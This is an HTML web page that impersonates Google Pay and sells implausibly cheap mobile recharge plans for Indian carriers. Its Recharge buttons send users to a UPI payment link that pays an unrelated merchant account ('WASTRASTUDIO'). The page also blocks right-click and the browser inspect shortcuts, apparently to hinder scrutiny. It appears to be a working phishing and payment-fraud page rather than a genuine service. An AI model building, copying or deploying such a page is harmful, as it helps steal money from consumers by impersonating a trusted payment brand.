<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <link rel="icon" href="assets/img/gpay.jpg" />
        <meta name="viewport" content="width=device-width,initial-scale=1" />
        <meta name="theme-color" content="#000000" />
        <meta name="description" content="Web site created using create-react-app" />
        <link rel="apple-touch-icon" href="assets/img/gpay.jpg" />
        <title>Google Pay Mobile Recharge New Plans</title>
        <link href="assets/css/style.css" rel="stylesheet" />


        <script>
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault(); // Prevent the default context menu
        });

        // Optionally, you can also prevent F12 (Inspect) key
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                e.preventDefault();
            }
        });
        </script>


        <!-- Meta Pixel Code -->
        <?php
            include 'pixel.php'; // or require 'pixel.php';
        ?>

        <!-- End Meta Pixel Code -->
    </head>
    <body>
        <noscript>You need to enable JavaScript to run this app.</noscript>
        <div>
            <div class="py-4 px-6 bg-white flex items-center justify-between border-b border-slate-100 mb-0">
                <div class="flex items-center">
                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="text-blue-500 mr-3" height="19" width="19" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"
                        ></path>
                    </svg>
                    <a href="/"><img src="assets/img/gpaylogo.a859e7ad6e3a2b75843f.png" alt="" class="h-8" /></a>
                </div>
                <div>
                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="text-blue-500" height="25" width="25" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M399 384.2C376.9 345.8 335.4 320 288 320H224c-47.4 0-88.9 25.8-111 64.2c35.2 39.2 86.2 63.8 143 63.8s107.8-24.7 143-63.8zM0 256a256 256 0 1 1 512 0A256 256 0 1 1 0 256zm256 16a72 72 0 1 0 0-144 72 72 0 1 0 0 144z"
                        ></path>
                    </svg>
                </div>
            </div>
            <div>
                <div class="bg-white py-4 px-4 text-[13.4px] flex items-center justify-between">
                    <div class="flex items-center">
                        <img
                            id="operatorImage"
                            alt=""
                            class="h-12 rounded-full"
                        />
                        <div class="font-bold text-[14px] text-blue-900 ml-2">
                            <div id="rechargeNumber"></div> <!-- Default number -->
                            <div id="operatorName" class="text-slate-500 font-normal text-[12px] mt-[-2px]"></div> <!-- Default operator -->
                        </div>
                    </div>
                    <a class="text-blue-600" href="/">Change</a>
                </div>
                
                <div class="px-2 my-0 bg-blue-50 py-5"><h1 class="text-[20px] font-bold text-center mt-[-2px]">Google Pay Exclusive!</h1></div>
                <div class="px-5 bg-white pt-1">
                    <div class="bg-white rounded-xl p-4 my-4 shadow-xl shadow-blue-100">
                        <div class="bg-rose-600 py-1 px-3 rounded text-white text-[10px] font-bold w-fit">Exclusive</div>
                        <div class="flex items-center justify-between my-2">
                            <div class="flex items-center text-[20px] font-bold text-slate-800">
                                <div>₹149</div>
                                <div class="ml-4 line-through text-slate-600">₹749</div>
                            </div>
                            <div><img src="assets/img/true5g.svg" alt="" /></div>
                        </div>
                        <div class="flex items-center justify-between mt-3">
                            <div class="">
                                <div class="text-slate-600 text-[13px]">VALIDITY</div>
                                <div class="text-slate-800 text-[13px] font-bold">84 days</div>
                            </div>
                            <div class="">
                                <div class="text-slate-600 text-[13px]">DATA</div>
                                <div class="text-slate-800 text-[13px] font-bold">1.5 GB/day</div>
                            </div>
                            <div class="">
                                <div class="text-slate-600 text-[13px]">Voice</div>
                                <div class="text-slate-800 text-[13px] font-bold">Unlimited</div>
                            </div>
                            <div class="">
                                <div class="text-slate-600 text-[13px]">SMS</div>
                                <div class="text-slate-800 text-[13px] font-bold">100/day</div>
                            </div>
                        </div>
                        <div class="mt-5"><button class="bg-blue-500 py-2 w-full text-[13px] rounded-full font-bold text-white" onclick="makePayment(149)">Recharge</button></div>
                    </div>
                    <div class="bg-white rounded-xl p-4 my-4 shadow-xl shadow-blue-100">
                        <div class="bg-rose-600 py-1 px-3 rounded text-white text-[10px] font-bold w-fit">Exclusive</div>
                        <div class="flex items-center justify-between my-2">
                            <div class="flex items-center text-[20px] font-bold text-slate-800">
                                <div>₹199</div>
                                <div class="ml-4 line-through text-slate-600">₹999</div>
                            </div>
                            <div><img src="assets/img/true5g.svg" alt="" /></div>
                        </div>
                        <div class="flex items-center justify-between mt-3">
                            <div class="">
                                <div class="text-slate-600 text-[13px]">VALIDITY</div>
                                <div class="text-slate-800 text-[13px] font-bold">84 days</div>
                            </div>
                            <div class="">
                                <div class="text-slate-600 text-[13px]">DATA</div>
                                <div class="text-slate-800 text-[13px] font-bold">2.0 GB/day</div>
                            </div>
                            <div class="">
                                <div class="text-slate-600 text-[13px]">Voice</div>
                                <div class="text-slate-800 text-[13px] font-bold">Unlimited</div>
                            </div>
                            <div class="">
                                <div class="text-slate-600 text-[13px]">SMS</div>
                                <div class="text-slate-800 text-[13px] font-bold">100/day</div>
                            </div>
                        </div>
                        <div class="mt-5"><button class="bg-blue-500 py-2 w-full text-[13px] rounded-full font-bold text-white" onclick="makePayment(199)">Recharge</button></div>
                    </div>
                    <div class="bg-white rounded-xl p-4 my-4 shadow-xl shadow-blue-100">
                        <div class="bg-rose-600 py-1 px-3 rounded text-white text-[10px] font-bold w-fit">Exclusive</div>
                        <div class="flex items-center justify-between my-2">
                            <div class="flex items-center text-[20px] font-bold text-slate-800">
                                <div>₹249</div>
                                <div class="ml-4 line-through text-slate-600">₹1299</div>
                            </div>
                            <div><img src="assets/img/true5g.svg" alt="" /></div>
                        </div>
                        <div class="flex items-center justify-between mt-3">
                            <div class="">
                                <div class="text-slate-600 text-[13px]">VALIDITY</div>
                                <div class="text-slate-800 text-[13px] font-bold">84 days</div>
                            </div>
                            <div class="">
                                <div class="text-slate-600 text-[13px]">DATA</div>
                                <div class="text-slate-800 text-[13px] font-bold">3.0 GB/day</div>
                            </div>
                            <div class="">
                                <div class="text-slate-600 text-[13px]">Voice</div>
                                <div class="text-slate-800 text-[13px] font-bold">Unlimited</div>
                            </div>
                            <div class="">
                                <div class="text-slate-600 text-[13px]">SMS</div>
                                <div class="text-slate-800 text-[13px] font-bold">100/day</div>
                            </div>
                        </div>
                        <div class="mt-5"><button class="bg-blue-500 py-2 w-full text-[13px] rounded-full font-bold text-white" onclick="makePayment(249)">Recharge</button></div>
                    </div>
                    <div class="bg-white rounded-xl p-4 my-4 shadow-xl shadow-blue-100">
                        <div class="bg-rose-600 py-1 px-3 rounded text-white text-[10px] font-bold w-fit">Exclusive</div>
                        <div class="flex items-center justify-between my-2">
                            <div class="flex items-center text-[20px] font-bold text-slate-800">
                                <div>₹279</div>
                                <div class="ml-4 line-through text-slate-600">₹1999</div>
                            </div>
                            <div><img src="assets/img/true5g.svg" alt="" /></div>
                        </div>
                        <div class="flex items-center justify-between mt-3">
                            <div class="">
                                <div class="text-slate-600 text-[13px]">VALIDITY</div>
                                <div class="text-slate-800 text-[13px] font-bold">6 month</div>
                            </div>
                            <div class="">
                                <div class="text-slate-600 text-[13px]">DATA</div>
                                <div class="text-slate-800 text-[13px] font-bold">2.0 GB/day</div>
                            </div>
                            <div class="">
                                <div class="text-slate-600 text-[13px]">Voice</div>
                                <div class="text-slate-800 text-[13px] font-bold">Unlimited</div>
                            </div>
                            <div class="">
                                <div class="text-slate-600 text-[13px]">SMS</div>
                                <div class="text-slate-800 text-[13px] font-bold">100/day</div>
                            </div>
                        </div>
                        <div class="mt-5"><button class="bg-blue-500 py-2 w-full text-[13px] rounded-full font-bold text-white" onclick="makePayment(279)">Recharge</button></div>
                    </div>
                    <div class="bg-white rounded-xl p-4 my-4 shadow-xl shadow-blue-100">
                        <div class="bg-rose-600 py-1 px-3 rounded text-white text-[10px] font-bold w-fit">Exclusive</div>
                        <div class="flex items-center justify-between my-2">
                            <div class="flex items-center text-[20px] font-bold text-slate-800">
                                <div>₹389</div>
                                <div class="ml-4 line-through text-slate-600">₹2499</div>
                            </div>
                            <div><img src="assets/img/true5g.svg" alt="" /></div>
                        </div>
                        <div class="flex items-center justify-between mt-3">
                            <div class="">
                                <div class="text-slate-600 text-[13px]">VALIDITY</div>
                                <div class="text-slate-800 text-[13px] font-bold">12 month</div>
                            </div>
                            <div class="">
                                <div class="text-slate-600 text-[13px]">DATA</div>
                                <div class="text-slate-800 text-[13px] font-bold">2.0 GB/day</div>
                            </div>
                            <div class="">
                                <div class="text-slate-600 text-[13px]">Voice</div>
                                <div class="text-slate-800 text-[13px] font-bold">Unlimited</div>
                            </div>
                            <div class="">
                                <div class="text-slate-600 text-[13px]">SMS</div>
                                <div class="text-slate-800 text-[13px] font-bold">100/day</div>
                            </div>
                        </div>
                        <div class="mt-5"><button class="bg-blue-500 py-2 w-full text-[13px] rounded-full font-bold text-white" onclick="makePayment(389)">Recharge</button></div>
                    </div>
                </div>
                <div></div>
                <img src="assets/img/gpayfooter.11f558d98dc0e11b50d8.webp" alt="" class="mt-10" />
            </div>
        </div>


        <div id="paymentModal" tabindex="-1" style="padding: 35px; display: none;" class="overflow-y-auto overflow-x-hidden fixed top-0 right-0 left-0 z-50 justify-center items-center w-full md:inset-0 h-screen max-h-full bg-slate-950/[.8]">
            <div class="relative p-4 w-full max-w-md max-h-full top-1/3">
                <div class="relative bg-white rounded-lg shadow">
                    <button type="button" class="absolute top-3 end-2.5 text-gray-400 bg-transparent hover:bg-gray-200 hover:text-gray-900 rounded-lg text-sm w-8 h-8 ms-auto inline-flex justify-center items-center" onclick="hideModal()">
                        <svg class="w-3 h-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 14">
                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6"></path>
                        </svg>
                        <span class="sr-only">Close modal</span>
                    </button>
                    <div class="p-4 md:p-5 text-center">
                        <svg class="mx-auto mb-4 text-gray-400 w-12 h-12" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20">
                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 11V6m0 8h.01M19 10a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z"></path>
                        </svg>
                        <h3 class="mb-5 text-lg font-normal text-gray-500">Payment Failed!</h3>
                        <button type="button" class="text-white bg-blue-500 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm inline-flex items-center px-5 py-2.5 text-center" onclick="retryPayment()">
                            Try Again
                        </button>
                        <button type="button" class="py-2.5 px-5 ms-3 text-sm font-medium text-gray-900 focus:outline-none bg-white rounded-lg border border-gray-200 hover:bg-gray-100 hover:text-blue-700 focus:z-10 focus:ring-4 focus:ring-gray-100" onclick="hideModal()">
                            Close
                        </button>
                    </div>
                </div>
            </div>
        </div>
        

    </body>

    <script>
        window.onload = function() {
    // Get data from localStorage
    const mobileNumber = localStorage.getItem('mobileNumber') || ''; // Fallback to default
    const network = localStorage.getItem('network') || ''; // Fallback to default

    // Update the DOM with the stored data
    document.getElementById('rechargeNumber').textContent = `Recharge for: ${mobileNumber}`;
    document.getElementById('operatorName').textContent = `${network} Prepaid`;

    // Update the image based on the network provider
    const operatorImage = document.getElementById('operatorImage');
    if (network === 'Jio') {
        operatorImage.src = 'assets/img/jio.png';
    } else if (network === 'Airtel') {
        operatorImage.src = 'assets/img/airtel.png';
    } else if (network === 'VI') {
        operatorImage.src = 'assets/img/vi.jpg';
    } else if (network === 'Bsnl') {
        operatorImage.src = 'assets/img/bsnl.png';
    }
};

function showModal(message) {
    document.getElementById('paymentModal').style.display = 'block';
    document.querySelector('#paymentModal h3').innerText = message;
}

function hideModal() {
    document.getElementById('paymentModal').style.display = 'none';
}

function retryPayment() {
    hideModal();
    // Call your payment function again or implement the retry logic here
}


function makePayment(a) {
    console.log(a);

    if (a > 0) {
        // Construct the UPI payment link
        const upiLink = `upi://pay?ver=01&mode=19&pa=wastrastudio161586.rzp@icici&pn=MOBILE RECHARGE&tr=RZPOz7M3uuL9qfPb0qrv2&cu=INR&mc=5651&qrMedium=04&tn=PaymenttoWASTRASTUDIO&am=${a}`;

        // Check if the device supports UPI links
        const isUPISupported = navigator.userAgent.match(/Android|iPhone|iPad|iPod|Windows Phone/i);

        if (isUPISupported) {
            // For mobile devices, open the UPI link
            window.location.href = upiLink;
        } else {
            console.log("UPI payment is only supported on mobile devices.");
            showModal("UPI payment is only supported on mobile devices."); // Show modal with error message
        }
    } else {
        console.log("Please enter a valid amount greater than zero.");
        showModal("Payment failed"); // Show modal for invalid amount
    }
}


    </script>

</html>
